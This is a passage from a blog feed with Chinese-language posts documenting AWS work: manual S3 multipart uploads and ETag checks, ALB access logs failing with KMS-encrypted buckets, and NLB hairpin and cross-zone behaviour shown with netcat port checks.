upload-part --bucket aaabbb --key tonghua.1G.MTU --part-number 3 --body              xac --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGv             tF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api upload-part --bucket aaabbb --key tonghua.1G.MTU --part-number 4 --body              xad --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGv             tF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api upload-part --bucket aaabbb --key tonghua.1G.MTU --part-number 5 --body              xae --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGv             tF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api upload-part --bucket aaabbb --key tonghua.1G.MTU --part-number 6 --body              xaf --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGv             tF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;77377273b0a4b61febdbf7bbf52b9db9\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li><li><p>上传完成之后先确认一下是否全都传上去了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api list-parts --bucket aaabbb --key tonghua.1G.MTU --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGvtF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Owner&quot;: &#123;</span><br><span class="line">        &quot;DisplayName&quot;: &quot;tonghua&quot;,</span><br><span class="line">        &quot;ID&quot;: &quot;75ca81520a6a8f31111e9ac0a8efec8c3b89076f67d161cdbc7382cb0aadc377&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Initiator&quot;: &#123;</span><br><span class="line">        &quot;DisplayName&quot;: &quot;xxxxx&quot;,</span><br><span class="line">        &quot;ID&quot;: &quot;arn:aws-cn:iam::297123123419:user/xxxxx&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Parts&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;LastModified&quot;: &quot;2019-11-08T09:05:05.000Z&quot;,</span><br><span class="line">            &quot;PartNumber&quot;: 1,</span><br><span class="line">            &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;,</span><br><span class="line">            &quot;Size&quot;: 209715200</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;LastModified&quot;: &quot;2019-11-08T09:05:35.000Z&quot;,</span><br><span class="line">            &quot;PartNumber&quot;: 2,</span><br><span class="line">            &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;,</span><br><span class="line">            &quot;Size&quot;: 209715200</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;LastModified&quot;: &quot;2019-11-08T09:05:51.000Z&quot;,</span><br><span class="line">            &quot;PartNumber&quot;: 3,</span><br><span class="line">            &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;,</span><br><span class="line">            &quot;Size&quot;: 209715200</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;LastModified&quot;: &quot;2019-11-08T09:06:07.000Z&quot;,</span><br><span class="line">            &quot;PartNumber&quot;: 4,</span><br><span class="line">            &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;,</span><br><span class="line">            &quot;Size&quot;: 209715200</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;LastModified&quot;: &quot;2019-11-08T09:06:21.000Z&quot;,</span><br><span class="line">            &quot;PartNumber&quot;: 5,</span><br><span class="line">            &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;,</span><br><span class="line">            &quot;Size&quot;: 209715200</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;LastModified&quot;: &quot;2019-11-08T09:06:35.000Z&quot;,</span><br><span class="line">            &quot;PartNumber&quot;: 6,</span><br><span class="line">            &quot;ETag&quot;: &quot;\&quot;77377273b0a4b61febdbf7bbf52b9db9\&quot;&quot;,</span><br><span class="line">            &quot;Size&quot;: 25165824</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;StorageClass&quot;: &quot;STANDARD&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li><li><p>确认无误后，将这些文件段组装在一起：<br>先创建1个文件fileparts.json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Parts&quot;: [&#123;</span><br><span class="line">        &quot;ETag&quot;: &quot;3566de3a97906edb98d004d6b947ae9b&quot;,</span><br><span class="line">        &quot;PartNumber&quot;:1</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;ETag&quot;: &quot;3566de3a97906edb98d004d6b947ae9b&quot;,</span><br><span class="line">        &quot;PartNumber&quot;:2</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;ETag&quot;: &quot;3566de3a97906edb98d004d6b947ae9b&quot;,</span><br><span class="line">        &quot;PartNumber&quot;:3</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;ETag&quot;: &quot;3566de3a97906edb98d004d6b947ae9b&quot;,</span><br><span class="line">        &quot;PartNumber&quot;:4</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;ETag&quot;: &quot;3566de3a97906edb98d004d6b947ae9b&quot;,</span><br><span class="line">        &quot;PartNumber&quot;:5</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;ETag&quot;: &quot;77377273b0a4b61febdbf7bbf52b9db9&quot;,</span><br><span class="line">        &quot;PartNumber&quot;:6</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>然后执行如下命令将其组装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api complete-multipart-upload --multipart-upload file://fileparts.json --bucket aaabbb --key tonghua.1G.MTU --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGvtF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;9088a3364a043bb55249cda2b0ff5fe1-6\&quot;&quot;,</span><br><span class="line">    &quot;Bucket&quot;: &quot;aaabbb&quot;,</span><br><span class="line">    &quot;Location&quot;: &quot;https://aaabbb.s3.cn-north-1.amazonaws.com.cn/tonghua.1G.MTU&quot;,</span><br><span class="line">    &quot;Key&quot;: &quot;tonghua.1G.MTU&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></p><p>那现在呢，分段上传操作其实就已经完成了。<br>可以再做一个文件完整性校验，两种方法，一种是将文件下载回来做与大文件做比对，一种是用S3 etag完整性校验做一个比对。</p><p>先来看看方法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3 cp s3://aaabbb/tonghua.1G.MTU tonghua.1G.MTU</span><br><span class="line">download: s3://aaabbb/tonghua.1G.MTU to ./tonghua.1G.MTU</span><br><span class="line">[root@ip-10-0-0-64 test]# md5sum tonghua.1G.MTU</span><br><span class="line">cd573cfaace07e7949bc0c46028904ff  tonghua.1G.MTU</span><br><span class="line">[root@ip-10-0-0-64 test]# md5sum tonghua.1G</span><br><span class="line">cd573cfaace07e7949bc0c46028904ff  tonghua.1G</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></p><p>嗯，没啥毛病。</p><p>方法二：<br>算法就是每一个分段的md5串在一起在求一个md5，完事后面-N就完事了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# echo &quot;3566de3a97906edb98d004d6b947ae9b3566de3a97906edb98d004d6b947ae9b3566de3a97906edb98d004d6b947ae9b3566de3a97906edb98d004d6b947ae9b3566de3a97906edb98d004d6b947ae9b77377273b0a4b61febdbf7bbf52b9db9&quot; | xxd -r -p | md5sum</span><br><span class="line">9088a3364a043bb55249cda2b0ff5fe1  -</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api head-object --bucket aaabbb --key tonghua.1G.MTU</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AcceptRanges&quot;: &quot;bytes&quot;,</span><br><span class="line">    &quot;ContentType&quot;: &quot;binary/octet-stream&quot;,</span><br><span class="line">    &quot;LastModified&quot;: &quot;Thu, 07 Nov 2019 06:27:23 GMT&quot;,</span><br><span class="line">    &quot;ContentLength&quot;: 1073741824,</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;9088a3364a043bb55249cda2b0ff5fe1-6\&quot;&quot;,</span><br><span class="line">    &quot;Metadata&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></p><p>至此，手动S3分段上传完成，也校验了文件完整性，感觉问题不大了。</p><h2 id="0x05-关于S3多文件上传的一些坑点"><a href="#0x05-关于S3多文件上传的一些坑点" class="headerlink" title="0x05 关于S3多文件上传的一些坑点"></a>0x05 关于S3多文件上传的一些坑点</h2><ol><li>我执行cp命令，自动分段上传，中间由于网络或者我手动停止了，我中间上传一半可能就断了，导致这部分残留的object片段不能看到完事还收钱。<br>可以用这个命令看到有没有残留的文件片段：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api list-multipart-uploads --bucket aaabbb                                              &#123;</span><br><span class="line">    &quot;Uploads&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Initiator&quot;: &#123;</span><br><span class="line">                &quot;DisplayName&quot;: &quot;11111&quot;,</span><br><span class="line">                &quot;ID&quot;: &quot;arn:aws-cn:iam::2971111111111111:user/11111&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Initiated&quot;: &quot;2019-11-08T13:24:45.000Z&quot;,</span><br><span class="line">            &quot;UploadId&quot;: &quot;fdsBIrZ4amSsimTB4uzZosKp0toutli9kZr8Twir0YGi.QqVvWTWwsCpjnxazEdHMjAlbSMqsEgcOqku2MO9FTXKsr_guaall14gYFZz5aVze05WSdbscDR07NlCZ09p&quot;,</span><br><span class="line">            &quot;StorageClass&quot;: &quot;STANDARD&quot;,</span><br><span class="line">            &quot;Key&quot;: &quot;test_multipart&quot;,</span><br><span class="line">            &quot;Owner&quot;: &#123;</span><br><span class="line">                &quot;DisplayName&quot;: &quot;tonghua&quot;,</span><br><span class="line">                &quot;ID&quot;: &quot;75ca81520a6a8f399c2e9ac0a8efec8c3b89076f67d161cdbc7382cb0aadc377&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li></ol><p>删除这些残留的文件，通常有两种方法：<br>方法一：使用cli命令手动删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api abort-multipart-upload --bucket aaabbb --key &quot;test_multipart&quot; --upload-id &quot;fdsBIrZ4amSsimTB4uzZosKp0toutli9kZr8Twir0YGi.QqVvWTWwsCpjnxazEdHMjAlbSMqsEgcOqku2MO9FTXKsr_guaall14gYFZz5aVze05WSdbscDR07NlCZ09p&quot;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></p><p>方法二：CCR生命周期规则走一波<br><img src="BA50E9E412D24C73BAFE2DCB0BB81672" alt="image"><br>保存之后就可以利用CCR定期删除残留的文件片段了。</p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>大概就是这样，先到这里了，溜了溜了。</p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><ul><li><a href="https://aws.amazon.com/premiumsupport/knowledge-center/s3-multipart-upload-cli/?nc1=h_ls" target="_blank" rel="noopener">How do I use the AWS CLI to perform a multipart upload of a file to Amazon S3?</a></li><li><a href="https://blog.csdn.net/beswkwangbo/article/details/46375795" target="_blank" rel="noopener">Linux 用dd生成指定大小的文件</a></li><li><a href="https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutObject.html" target="_blank" rel="noopener">PutObject</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/topic/s3-config.html" target="_blank" rel="noopener">AWS CLI S3 Configuration</a></li><li><a href="https://xbuba.com/questions/12186993" target="_blank" rel="noopener">为大于5GB的文件计算Amazon-S3 Etag的算法是什么？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;记录一下S3分段上传相关的内容，主要涉及到原理以及使用方法，还有一些坑什么的。&lt;/p&gt;
&lt;h2 id
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AWS ALB Access log与KMS加密S3 Bucket的那些恩怨情仇</title>
    <link href="https://tonghuaroot.com/2019/11/01/AWS-ALB-Access-log-And-KMS/"/>
    <id>https://tonghuaroot.com/2019/11/01/AWS-ALB-Access-log-And-KMS/</id>
    <published>2019-11-01T00:59:56.000Z</published>
    <updated>2019-11-01T09:01:13.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>偶然遇到的一个问题，记录一下测试过程。<br>先说结论：AWS ALB Access log推荐使用SSE-S3的加密方式或者不加密的方式。截止目前不支持使用KMS加密的S3 Bucket。</p><h2 id="0x01-ALB配置access-log的常规流程"><a href="#0x01-ALB配置access-log的常规流程" class="headerlink" title="0x01 ALB配置access log的常规流程"></a>0x01 ALB配置access log的常规流程</h2><p>通常情况下，我们要给ALB开一个Access Log除了要选择S3 Bucket外，还要保证目标S3 Bucket有ALB PutObject的权限。<br><img src="A5F92B10074A476F924A5CC8C8CA427E" alt="image"></p><p>示例Policy如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Principal&quot;: &#123;</span><br><span class="line">                &quot;AWS&quot;: &quot;arn:aws-cn:iam::638102146993:root&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Action&quot;: &quot;s3:PutObject&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;arn:aws-cn:s3:::aaabbb/*&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那如果这个时候S3 Bucket不采用任何加密方式，或者使用SSE-S3的加密方式的话，已经可以正常使用了。</p><p><img src="7C0BFCBF860E46C68F777CAD034B46E3" alt="image"></p><h2 id="0x02-ALB-Access-log-不支持使用KMS加密的S3-Bucket"><a href="#0x02-ALB-Access-log-不支持使用KMS加密的S3-Bucket" class="headerlink" title="0x02 ALB Access log 不支持使用KMS加密的S3 Bucket"></a>0x02 ALB Access log 不支持使用KMS加密的S3 Bucket</h2><p>但是如果要是使用KMS加密的话，直接保存的时候就会报错了，而我也确认在KMS端我们给了ELB服务账号638102146993的访问权限。</p><p><img src="1B8E49A889664B86B9727FD8393BA7C8" alt="image"></p><p>文档里倒是没有明确说明不支持，但是我在<a href="https://forums.aws.amazon.com/message.jspa?messageID=903843" target="_blank" rel="noopener">论坛</a>里看到这么一句话：“storing ALB access logs in a S3 bucket with SSE-KMS encryption enabled is still not supported.”。所以截至目前还没上这个功能呢。</p><h2 id="0x03-先设置为access-log的S3-Bucket，然后再修改为KMS加密会怎么样？"><a href="#0x03-先设置为access-log的S3-Bucket，然后再修改为KMS加密会怎么样？" class="headerlink" title="0x03 先设置为access log的S3 Bucket，然后再修改为KMS加密会怎么样？"></a>0x03 先设置为access log的S3 Bucket，然后再修改为KMS加密会怎么样？</h2><p>然后我又做了这个实验，测试过程：</p><p><img src="6BA7E70DE95C48A2B95BEDCD40B08B09" alt="image"></p><p>这个是之前打进来的测试文件，可以看到，每次设置access log的时候，它会先put一个测试文件，如果put失败了，那也就设置不成功，所以会返回错误。</p><p>回到测试过程，我现在已经将access log配置好了，然后修改了S3的加密方式为KMS加密</p><p><img src="1E8EAE0789454B00B86ECFD47F2F3D41" alt="image"></p><p>等20分钟。</p><p><img src="BD5CEA846AF044E6AAF058385EFA4E2F" alt="image"></p><p>卧槽竟然收到日志了，神奇。。。为了避免是延迟导致的，所以我有做了一个测试，发现还能写进去，加密方式是原来的AES-256（SSE-S3）。interesting</p><p><img src="6ED3F566228446DDB01040B27EA3DA7F" alt="image"></p><h2 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h2><p>如果要做ALB的Access log，可以使用未加密的S3 Bucket，或者使用SSE-S3加密的S3 Bucket。</p><p>不过为啥我后来改为KMS，但是它成功了（传上去的log加密方式还是AES256 SSE-S3），而在最开始设置的时候就没成功，我理解他背后调用的都是<a href="https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutObject.html" target="_blank" rel="noopener">PutObject</a>，既然我加密方式选择为KMS了，但是传上去的log加密却是SSE-S3？interesting。</p><p>嗯，后来请教了大佬，目前就是不支持使用KMS加密的S3 Bucket存放ALB的Access log的。hhh</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://forums.aws.amazon.com/message.jspa?messageID=903843" target="_blank" rel="noopener">Storing Application Load Balancer access logs in a KMS-encrypted S3 bucket</a></li><li><a href="https://docs.amazonaws.cn/en_us/elasticloadbalancing/latest/application/load-balancer-access-logs.html" target="_blank" rel="noopener">Access Logs for Your Application Load Balancer</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;偶然遇到的一个问题，记录一下测试过程。&lt;br&gt;先说结论：AWS ALB Access log推荐使用
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>几个关于AWS NLB的有趣问题</title>
    <link href="https://tonghuaroot.com/2019/10/31/about-aws-nlb-interesting-qa/"/>
    <id>https://tonghuaroot.com/2019/10/31/about-aws-nlb-interesting-qa/</id>
    <published>2019-10-31T20:11:59.000Z</published>
    <updated>2019-11-01T04:19:40.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>分享几个关于NLB的有趣问题。</p><h2 id="0x01-架构概述"><a href="#0x01-架构概述" class="headerlink" title="0x01 架构概述"></a>0x01 架构概述</h2><ol><li>我有一个internal的NLB（跨两个AZ），监听33端口</li><li>NLB后端有1个EC2实例（实例B），监听22端口</li><li>我还有一个EC2实例作为客户端（实例A）</li></ol><h2 id="0x02-相关问题"><a href="#0x02-相关问题" class="headerlink" title="0x02 相关问题"></a>0x02 相关问题</h2><h3 id="2-1-实例B不能正常访问NLB，但是实例A可以"><a href="#2-1-实例B不能正常访问NLB，但是实例A可以" class="headerlink" title="2.1 实例B不能正常访问NLB，但是实例A可以"></a>2.1 实例B不能正常访问NLB，但是实例A可以</h3><p>这个最开始我还觉得奇怪，手动测试了一下，确实是这样：<br>实例B（10.0.0.64是实例B的IP，10.0.1.170是NLB的IP）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -vz 10.0.1.170 33</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connection timed out.</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -vz 10.0.0.64 22</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:22.</span><br><span class="line">Ncat: 0 bytes sent, 0 bytes received in 0.01 seconds.</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure></p><p><img src="F1C5DB5028914663903053D20CFBFC65" alt="image"></p><p>实例A访问NLB和实例B都是可以正常访问的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[2019-11-01 11:53.25]  ~</span><br><span class="line">[Administrator.EC2AMAZ-OKAR8BT] ➤ nc -vz 10.0.1.170 33</span><br><span class="line">Connection to 10.0.1.170 33 port [tcp/*] succeeded!</span><br><span class="line">[2019-11-01 11:53.27]  ~</span><br><span class="line">[Administrator.EC2AMAZ-OKAR8BT] ➤ nc -vz 10.0.0.64 22</span><br><span class="line">Connection to 10.0.0.64 22 port [tcp/ssh] succeeded!</span><br></pre></td></tr></table></figure><p><img src="A2836EBDE268492F98B00552DCDC1570" alt="image"></p><p>请教了一下大佬，这种现象其实是正常的，NLB做的流量转发会把目的IP地址转过去，如果我src IP与dst的IP相等的话，那自然会被丢弃掉，这也就造成了，如果我在后端实例上访问NLB的端口会出现time out的现象。</p><p>此外，NLB的官方文档也有对此部分的说明，可以参考：<a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/load-balancer-troubleshooting.html" target="_blank" rel="noopener">Troubleshoot Your Network Load Balancer</a>中“Connections time out for requests from a target to its load balancer”部分。</p><p>上面我是通过实例ID注册的，那我如果通过IP注册（这也是文档中提到的解决方法之一）的话，就不会有这个问题了。效果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 about-aws-nlb-interesting-qa]# nc -vz 10.0.1.170 44</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.1.170:44.</span><br><span class="line">Ncat: 0 bytes sent, 0 bytes received in 0.01 seconds.</span><br></pre></td></tr></table></figure></p><p><img src="914F39EB23C34964A613ADC90E28C669" alt="image"></p><h3 id="2-2-NLB如果不开通“Cross-Zone-Load-Balancing”功能，流量是不会跨AZ转发至后端EC2实例的"><a href="#2-2-NLB如果不开通“Cross-Zone-Load-Balancing”功能，流量是不会跨AZ转发至后端EC2实例的" class="headerlink" title="2.2 NLB如果不开通“Cross-Zone Load Balancing”功能，流量是不会跨AZ转发至后端EC2实例的"></a>2.2 NLB如果不开通“Cross-Zone Load Balancing”功能，流量是不会跨AZ转发至后端EC2实例的</h3><p>这个场景比如说，我有一个NLB跨了两个AZ（cn-north-1a，cn-north-1b），然后我后端仅有1台EC2实例（在cn-north-1b中）。如果我访问cn-north-1a的NLB IP，则会出现访问超时的现象，而访问cn-north-1b则不会有这个问题。这是因为我如果没开“Cross-Zone Load Balancing”功能的话，流量是不会跨AZ转发的。</p><p>开通“Cross-Zone Load Balancing”功能的方法也很简单，console上点一下：</p><p><img src="95AF595C05FF424F97383A550BB86052" alt="image"></p><p>完事现在支持跨AZ负载均衡就没啥问题了，当然如果不考虑高可用NLB只有一个AZ的话也没有这个问题了。</p><p>(以上内容目前仅测试了internal NLB)</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><ul><li><a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/load-balancer-troubleshooting.html" target="_blank" rel="noopener">Troubleshoot Your Network Load Balancer</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
